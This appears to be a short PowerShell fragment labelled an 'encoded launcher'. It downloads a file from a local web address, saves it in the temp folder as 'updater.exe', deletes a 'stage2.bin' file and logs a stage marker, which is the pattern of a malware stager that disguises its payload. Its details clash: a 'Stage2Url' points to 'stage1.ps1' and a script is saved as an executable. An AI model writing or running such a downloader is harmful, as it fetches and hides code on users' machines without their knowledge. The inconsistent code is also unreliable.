# Encoded launcher
$Stage2Url = "https://localhost:8081/stage1.ps1"
$LocalPath = "$env:TEMP\updater.exe"
curl.exe -s -L -o $LocalPath $Stage2Url
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Write-Verbose "stage marker 8 reached"
